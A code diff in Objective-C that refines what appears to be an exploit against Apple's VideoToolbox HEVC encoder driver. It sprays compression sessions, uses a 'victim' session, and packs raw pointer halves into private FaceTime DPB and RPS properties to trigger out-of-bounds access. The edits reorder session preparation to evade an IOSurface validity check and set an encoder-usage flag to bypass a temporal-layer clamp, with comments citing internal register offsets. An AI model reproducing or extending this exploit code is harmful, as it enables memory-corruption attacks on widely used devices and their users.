@@ -340,6 +340,19 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         VTSessionSetProperty(victim, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@15);
         VTSessionSetProperty(victim, CFSTR("BaseLayerFrameRate"), (__bridge CFNumberRef)@30);
         OSStatus nPreSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@7);
+        // Prepare and encode clean IDR [0] BEFORE loading raw non-IOSurfaceID pairs into UserDPBFramesForFaceTime
+        // (SetDPBSnapShot during PrepareToEncodeFrames calls IOSurfaceLookup on non-zero DPB slots and returns -17691
+        // if raw target pointer halves are pre-loaded before PrepareToEncodeFrames).
+        OSStatus vPrep = VTCompressionSessionPrepareToEncodeFrames(victim);
+        OSStatus e0 = -1;
+        NSString *cb0 = @"(no cb)";
+        CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
+        if (pb) {
+            e0 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+            SpriteDrain(victim, vSink, 1, 500);
+            @synchronized (vSink) { cb0 = vSink.firstObject ?: @"(no cb)"; }
+            CVPixelBufferRelease(pb);
+        }
         OSStatus setDpbPre = VTSessionSetProperty(victim, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpb34);
         uint64_t rbOobPair16 = 0;
         CFTypeRef rpsAliasRef = NULL;
@@ -354,20 +367,10 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             }
             CFRelease(rpsAliasRef);
         }
-        OSStatus vPrep = VTCompressionSessionPrepareToEncodeFrames(victim);
-        OSStatus e0 = -1;
-        NSString *cb0 = @"(no cb)";
-        CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
-        if (pb) {
-            e0 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
-            SpriteDrain(victim, vSink, 1, 500);
-            @synchronized (vSink) { cb0 = vSink.firstObject ?: @"(no cb)"; }
-            CVPixelBufferRelease(pb);
-        }
         OSStatus setInner = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[ bigDict ]);
         OSStatus setOuter = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps8);
         OSStatus setDpbPost = VTSessionSetProperty(victim, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpb34);
-        OSStatus privNSt = VTSessionSetProperty(victim, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(pNtl));
+        OSStatus uPostSt = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
         OSStatus nPostSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(pNtl));
         int rbPostNtl = -1;
         CFNumberRef rbN = NULL;
@@ -376,7 +379,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             CFRelease(rbN);
         }
         [report appendFormat:@"pcontrol v2 victim=%p ntl=%d(x0=0x%016llx) pm=%d nPre7=%d prep=%d enc0=%d(%@) nPost=%d/%d(rb=%d)\n",
-         (void *)victim, pNtl, pTargetX0, (int)pmSt, (int)nPreSt, (int)vPrep, (int)e0, cb0, (int)privNSt, (int)nPostSt, rbPostNtl];
+         (void *)victim, pNtl, pTargetX0, (int)pmSt, (int)nPreSt, (int)vPrep, (int)e0, cb0, (int)uPostSt, (int)nPostSt, rbPostNtl];
         [report appendFormat:@"pcontrol set inner(64)=%d outer(arr8)=%d dpb34=%d/%d(oobPair16=0x%016llx)\n",
          (int)setInner, (int)setOuter, (int)setDpbPre, (int)setDpbPost, rbOobPair16];
         [self journal:[NSString stringWithFormat:@"PCONTROL_V2 ntl=%d inner=%d outer=%d dpb34=%d enc0=%d(%@)",
@@ -412,22 +415,19 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             [report appendFormat:@"victim NTL=%d create failed=%d\n", vntl, (int)vst];
             continue;
         }
-        // Companion Usage=1 session for unclamped pre-prepare AVE_PSGen::Init (fn#1816) NTL write
+        // Companion Usage=1 session for unclamped pre-prepare AVE_PSGen::Init (fn#1816) NTL write.
+        // Must explicitly call VTSessionSetProperty(uVictim, "EncoderUsage", @1) BEFORE setting
+        // NumberOfTemporalLayers so [x19 + 0x1a0d8] == 1 and SetNumberOfTemporalLayers accepts vntl > 4.
         VTCompressionSessionRef uVictim = NULL;
         int u1Pre = -1, u1Post = -1;
         OSStatus u1Prep = -999;
         if (vntl < 16463) {
-            NSDictionary *uspec = @{
-                @"EncoderUsage": @1,
-                @"NumberOfTemporalLayers": @(vntl),
-                @"AllowTemporalCompression": @YES,
-            };
             if (VTCompressionSessionCreate(kCFAllocatorDefault, W, H, kCMVideoCodecType_HEVC,
-                                           (__bridge CFDictionaryRef)uspec, NULL, NULL, NULL, NULL, &uVictim) == noErr && uVictim) {
+                                           NULL, NULL, NULL, NULL, NULL, &uVictim) == noErr && uVictim) {
                 VTSessionSetProperty(uVictim, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
+                VTSessionSetProperty(uVictim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                 VTSessionSetProperty(uVictim, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                 VTSessionSetProperty(uVictim, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
-                VTSessionSetProperty(uVictim, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(vntl));
                 VTSessionSetProperty(uVictim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(vntl));
                 CFNumberRef urb = NULL;
                 if (VTSessionCopyProperty(uVictim, CFSTR("NumberOfTemporalLayers"), NULL, &urb) == noErr && urb) {
@@ -512,6 +512,12 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         VTSessionSetProperty(s, CFSTR("AverageBitRate"), (__bridge CFNumberRef)@(marker));
         VTSessionSetProperty(s, CFSTR("MaxKeyFrameIntervalDuration"), (__bridge CFNumberRef)@(marker));
 
+        // Prepare session BEFORE setting raw x0cand halves into UserDPBFramesForFaceTime so
+        // SetDPBSnapShot during PrepareToEncodeFrames does not fail IOSurfaceLookup (-17691).
+        if (VTCompressionSessionPrepareToEncodeFrames(s) == noErr) {
+            sibPrepOk++;
+        }
+
         NSMutableArray *dpb34 = [NSMutableArray arrayWithCapacity:34];
         for (int p = 0; p < 17; p++) {
             [dpb34 addObject:@((int32_t)cLo)];
@@ -537,10 +543,6 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         };
         VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"),
                              (__bridge CFTypeRef)@[ rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOob ]);
-
-        if (VTCompressionSessionPrepareToEncodeFrames(s) == noErr) {
-            sibPrepOk++;
-        }
         [siblings addObject:[NSValue valueWithPointer:s]];
     }
     [self journal:[NSString stringWithFormat:@"SPRAY_DONE n=%d prepOk=%d marker=0x%08x ntl=%d",
@@ -680,7 +682,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             }
             NSString *cb0 = nil;
             @synchronized (vSink) { cb0 = vSink.firstObject ?: @"(no cb)"; }
-            OSStatus stPostPriv = VTSessionSetProperty(victim, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(vntl));
+            OSStatus stPostUsage = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
             OSStatus stPostPub = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(vntl));
             int postEncNtl = -1;
             CFNumberRef rbPost = NULL;
@@ -689,7 +691,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                 CFRelease(rbPost);
             }
             [report appendFormat:@"first-encode trigger (NTL=%d) -> %d (%@) | postLatch=%d/%d(POST_ENC=%d)\n",
-             vntl, (int)e0, cb0, (int)stPostPriv, (int)stPostPub, postEncNtl];
+             vntl, (int)e0, cb0, (int)stPostUsage, (int)stPostPub, postEncNtl];
         }
         VTCompressionSessionInvalidate(victim);
         CFRelease(victim);
